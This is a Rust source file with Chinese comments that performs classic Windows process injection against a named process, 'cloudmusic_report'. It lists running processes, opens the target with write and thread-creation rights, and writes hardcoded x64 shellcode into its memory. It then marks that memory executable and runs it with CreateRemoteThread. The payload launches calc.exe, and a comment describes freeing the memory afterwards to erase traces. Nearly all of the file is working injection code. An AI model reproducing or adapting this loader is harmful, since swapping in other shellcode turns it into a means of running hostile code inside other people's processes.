mod process;

use std::ffi::OsString;
use std::os::windows::ffi::OsStringExt;
use std::ptr;
use winapi::ctypes::c_void;

// 导入基础类型
use winapi::shared::basetsd::SIZE_T;
use winapi::shared::minwindef::{DWORD, LPVOID};

// 导入Windows API模块（补全所有缺失导入，修复编译错误）
use winapi::um::{
    errhandlingapi::GetLastError,
    handleapi::CloseHandle,
    memoryapi::{VirtualAllocEx, VirtualFreeEx, VirtualProtectEx, VirtualQueryEx, WriteProcessMemory},
    processthreadsapi::{CreateRemoteThread, OpenProcess},
    psapi::GetProcessMemoryInfo,
    tlhelp32::{
        CreateToolhelp32Snapshot, Process32FirstW, Process32NextW, PROCESSENTRY32W,
        TH32CS_SNAPPROCESS,
    },
    winnt::{
        HANDLE, MEM_COMMIT, MEM_FREE, MEM_RELEASE, MEMORY_BASIC_INFORMATION, PAGE_EXECUTE_READ,
        PAGE_NOACCESS, PAGE_READWRITE,
    },
};

// 手动定义Windows进程权限常量
const PROCESS_QUERY_INFORMATION: u32 = 0x0400;
const PROCESS_VM_READ: u32 = 0x0010;
const PROCESS_VM_OPERATION: u32 = 0x0008;
const PROCESS_VM_WRITE: u32 = 0x0020;
const PROCESS_CREATE_THREAD: u32 = 0x0002;

// 显式定义 INVALID_HANDLE_VALUE 常量
const INVALID_HANDLE_VALUE: HANDLE = -1i64 as HANDLE;
const REQUIRED_DLL_SIZE: SIZE_T = 1024 * 1024; // 1MB

// 64位Windows 弹出calc.exe的Shellcode（兼容Windows 10/11，适配edition=2024）
const CALC_SHELLCODE: &[u8] = &[
    0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52,
    0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48,
    0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9,
    0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
    0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48,
    0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01,
    0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48,
    0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
    0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c,
    0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0,
    0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04,
    0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
    0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48,
    0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b, 0x6f,
    0x87, 0xff, 0xd5, 0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
    0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb,
    0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c,
    0x63, 0x2e, 0x65, 0x78, 0x65, 0x00,
];

/// 枚举Windows系统中所有进程，返回进程信息列表（进程名称、PID、父进程PID）
fn enum_all_processes() -> Vec<(String, u32, u32)> {
    let mut process_list = Vec::new();

    // 创建进程快照
    let snapshot_handle: HANDLE = unsafe { CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) };
    if snapshot_handle == INVALID_HANDLE_VALUE {
        eprintln!("创建进程快照失败，错误码：{}", unsafe { GetLastError() });
        return process_list;
    }

    // 初始化进程信息结构体
    let mut process_entry = PROCESSENTRY32W {
        dwSize: std::mem::size_of::<PROCESSENTRY32W>() as u32,
        cntUsage: 0,
        th32ProcessID: 0,
        th32DefaultHeapID: 0,
        th32ModuleID: 0,
        cntThreads: 0,
        th32ParentProcessID: 0,
        pcPriClassBase: 0,
        dwFlags: 0,
        szExeFile: [0; 260],
    };

    // 获取第一个进程信息
    let first_process_success = unsafe { Process32FirstW(snapshot_handle, &mut process_entry) };
    if first_process_success == 0 {
        eprintln!("获取第一个进程信息失败，错误码：{}", unsafe { GetLastError() });
        unsafe { CloseHandle(snapshot_handle) };
        return process_list;
    }

    // 遍历所有进程
    loop {
        // 宽字符数组转Rust字符串
        let process_name_os: OsString = unsafe {
            let end_index = process_entry.szExeFile
                .iter()
                .position(|&c| c == 0)
                .unwrap_or(260);
            OsStringExt::from_wide(&process_entry.szExeFile[0..end_index])
        };
        let process_name = process_name_os.to_string_lossy().into_owned();

        // 提取进程信息
        let process_pid = process_entry.th32ProcessID;
        let parent_pid = process_entry.th32ParentProcessID;
        process_list.push((process_name, process_pid, parent_pid));

        // 获取下一个进程
        let next_process_success = unsafe { Process32NextW(snapshot_handle, &mut process_entry) };
        if next_process_success == 0 {
            let last_error = unsafe { GetLastError() };
            if last_error != 18 {
                eprintln!("遍历进程时出错，错误码：{}", last_error);
            }
            break;
        }
    }

    // 释放快照句柄
    unsafe { CloseHandle(snapshot_handle) };
    process_list
}

/// 从进程列表中根据进程名称查找对应的PID（兼容忽略.exe后缀）
fn find_process_pid(process_list: &[(String, u32, u32)], target_name: &str) -> Option<u32> {
    // 兼容两种名称：带.exe和不带.exe
    let target_names = [
        target_name.to_string(),
        format!("{}.exe", target_name),
    ];
    process_list
        .iter()
        .find(|(name, _, _)| target_names.contains(name) || name.contains(target_name))
        .map(|(_, pid, _)| *pid)
}

/// 封装：查询进程的整体内存使用情况
fn query_process_overall_memory(h_process: *mut c_void) -> Result<(), &'static str> {
    let mut mem_info = winapi::um::psapi::PROCESS_MEMORY_COUNTERS_EX {
        cb: std::mem::size_of::<winapi::um::psapi::PROCESS_MEMORY_COUNTERS_EX>() as DWORD,
        PageFaultCount: 0,
        PeakWorkingSetSize: 0,
        WorkingSetSize: 0,
        QuotaPeakPagedPoolUsage: 0,
        QuotaPagedPoolUsage: 0,
        QuotaPeakNonPagedPoolUsage: 0,
        QuotaNonPagedPoolUsage: 0,
        PagefileUsage: 0,
        PeakPagefileUsage: 0,
        PrivateUsage: 0,
    };

    unsafe {
        if GetProcessMemoryInfo(
            h_process,
            &mut mem_info as *mut _ as *mut winapi::um::psapi::PROCESS_MEMORY_COUNTERS,
            mem_info.cb,
        ) == 0
        {
            return Err("获取进程整体内存信息失败");
        }
    }

    println!("=== 目标进程整体内存使用情况 ===");
    println!(
        "工作集大小（物理内存使用）：{:.2} MB",
        mem_info.WorkingSetSize as f64 / 1024.0 / 1024.0
    );
    println!(
        "页面文件使用（虚拟内存使用）：{:.2} MB",
        mem_info.PagefileUsage as f64 / 1024.0 / 1024.0
    );
    println!(
        "私有内存大小：{:.2} MB",
        mem_info.PrivateUsage as f64 / 1024.0 / 1024.0
    );
    println!("====================================\n");

    Ok(())
}

/// 封装：枚举目标进程的虚拟地址空间
fn check_process_virtual_address_space(h_process: *mut c_void) -> Result<bool, &'static str> {
    let mut address: LPVOID = 0 as LPVOID;
    let mut mbi: MEMORY_BASIC_INFORMATION = unsafe { std::mem::zeroed() };
    let mbi_size = std::mem::size_of::<MEMORY_BASIC_INFORMATION>() as SIZE_T;

    println!(
        "=== 枚举目标进程虚拟地址空间（查找 {} MB 连续空闲区域）===",
        REQUIRED_DLL_SIZE as f64 / 1024.0 / 1024.0
    );

    unsafe {
        while VirtualQueryEx(h_process, address, &mut mbi, mbi_size) == mbi_size {
            if mbi.State == MEM_FREE && mbi.Protect == PAGE_NOACCESS {
                let region_size = mbi.RegionSize;
                let region_start = mbi.BaseAddress as u64;
                let region_end = region_start + region_size as u64;

                println!(
                    "空闲区域：0x{:X} - 0x{:X}，大小：{:.2} MB",
                    region_start,
                    region_end,
                    region_size as f64 / 1024.0 / 1024.0
                );

                if region_size >= REQUIRED_DLL_SIZE {
                    println!("\n找到足够大的空闲虚拟地址区域！大小满足DLL加载要求。");
                    return Ok(true);
                }
            }
            address = ((mbi.BaseAddress as u64) + mbi.RegionSize as u64) as LPVOID;
        }
    }

    Err("未找到足够大的虚拟地址空闲区域，无法加载DLL")
}

/// 核心注入函数 - 向目标进程写入Shellcode并执行（弹出计算器）
/// 修复所有参数不全问题，补全5参数API的缺失参数
fn inject_and_execute_calc(h_process: HANDLE) -> Result<(), &'static str> {
    let shellcode_size = CALC_SHELLCODE.len();

    // 1. 在目标进程中分配可读写内存（PAGE_READWRITE）- 补全第5个参数 PAGE_READWRITE
    let remote_mem = unsafe {
        VirtualAllocEx(
            h_process,
            ptr::null_mut(), // 让系统自动选择内存地址
            shellcode_size,
            MEM_COMMIT, // 提交内存
            PAGE_READWRITE, // 补全：内存初始权限（之前缺失此参数）
        )
    };
    if remote_mem == ptr::null_mut() {
        return Err("分配远程进程内存失败");
    }
    println!("成功在目标进程分配内存，地址：{:p}，大小：{} 字节", remote_mem, shellcode_size);

    // 2. 将计算器Shellcode写入分配的远程内存 - 补全第5个参数 bytes_written
    let mut bytes_written: SIZE_T = 0; // 用于接收实际写入的字节数（补全参数）
    let write_success = unsafe {
        WriteProcessMemory(
            h_process,
            remote_mem,
            CALC_SHELLCODE.as_ptr() as LPVOID,
            shellcode_size,
            &mut bytes_written, // 补全：输出参数，接收实际写入字节数
        )
    };
    if write_success == 0 || bytes_written != shellcode_size {
        // 修复：释放内存使用 VirtualFreeEx 而非 VirtualAllocEx
        unsafe { VirtualFreeEx(h_process, remote_mem, 0, MEM_RELEASE) };
        return Err("写入Shellcode到远程进程失败");
    }
    println!("成功写入Shellcode到远程内存，写入字节数：{}", bytes_written);

    // 3. 修改远程内存权限：从RW（可读可写）改为RX（可读可执行）- 补全第5个参数 old_protect
    let mut old_protect: DWORD = 0; // 用于接收旧的内存权限（补全参数）
    let protect_success = unsafe {
        VirtualProtectEx(
            h_process,
            remote_mem,
            shellcode_size,
            PAGE_EXECUTE_READ,
            &mut old_protect, // 补全：输出参数，接收旧权限
        )
    };
    if protect_success == 0 {
        unsafe { VirtualFreeEx(h_process, remote_mem, 0, MEM_RELEASE) };
        return Err("修改远程内存权限为可执行失败");
    }
    println!("成功修改远程内存权限：0x{:X} → 0x{:X}", old_protect, PAGE_EXECUTE_READ);

    // 4. 创建远程线程，执行Shellcode（弹出计算器）
    let remote_thread = unsafe {
        CreateRemoteThread(
            h_process,
            ptr::null_mut(), // 线程属性默认
            0, // 栈大小默认
            Some(std::mem::transmute(remote_mem)), // 线程入口 = Shellcode内存地址
            ptr::null_mut(), // 无线程参数
            0, // 立即启动线程
            ptr::null_mut(), // 不获取线程ID
        )
    };
    if remote_thread == INVALID_HANDLE_VALUE || remote_thread == ptr::null_mut() {
        unsafe { VirtualFreeEx(h_process, remote_mem, 0, MEM_RELEASE) };
        return Err("创建远程线程执行Shellcode失败");
    }
    println!("成功创建远程线程，线程句柄：{:p}", remote_thread);

    // 5. 等待线程执行完成（确保计算器弹出，延时2秒）
    std::thread::sleep(std::time::Duration::from_secs(2));

    // 6. 清理资源：释放线程句柄和远程内存
    unsafe {
        CloseHandle(remote_thread);
        VirtualFreeEx(h_process, remote_mem, 0, MEM_RELEASE); // 释放远程内存，消除痕迹
    }
    println!("注入流程完成，计算器已弹出！");

    Ok(())
}

fn main() {
    println!("开始枚举Windows系统所有进程...");
    println!("====================================");
    println!("进程名称\t\tPID\t\t父进程PID");
    println!("====================================");

    // 1. 定义目标进程名称（兼容cloudmusic_report和cloudmusic_reporter.exe）
    let target_process = "cloudmusic_report";

    // 2. 枚举所有进程
    let process_list = enum_all_processes();

    // 3. 遍历输出所有进程
    for (name, pid, parent_pid) in &process_list {
        println!("{:<20}\t{:<10}\t{}", name, pid, parent_pid);
    }

    println!("====================================");
    println!("枚举完成，共找到 {} 个进程", process_list.len());

    // 4. 查找目标进程对应的PID
    let target_pid = match find_process_pid(&process_list, target_process) {
        Some(pid) => pid,
        None => {
            eprintln!("\n未找到目标进程：{}（含.exe后缀）", target_process);
            return;
        }
    };
    println!("\n找到目标进程 {}，对应的PID：{}", target_process, target_pid);

    // 5. 调用OpenProcess，传入注入必需的完整权限
    let h_process = unsafe {
        OpenProcess(
            PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD,
            0, // 不继承句柄
            target_pid,
        )
    };

    // 6. 检查进程句柄是否获取成功
    if h_process == ptr::null_mut() || h_process == INVALID_HANDLE_VALUE {
        eprintln!("打开目标进程失败，错误码：{}", unsafe { GetLastError() });
        return;
    }
    println!("成功打开目标进程，句柄：{:p}", h_process);

    // 7. （可选）查询进程内存信息
    if let Err(e) = query_process_overall_memory(h_process) {
        eprintln!("{}", e);
    }

    // 8. 核心步骤：注入Shellcode并执行，弹出计算器
    if let Err(e) = inject_and_execute_calc(h_process) {
        eprintln!("注入执行失败：{}", e);
    }

    // 9. 释放进程句柄
    unsafe {
        CloseHandle(h_process);
    }
}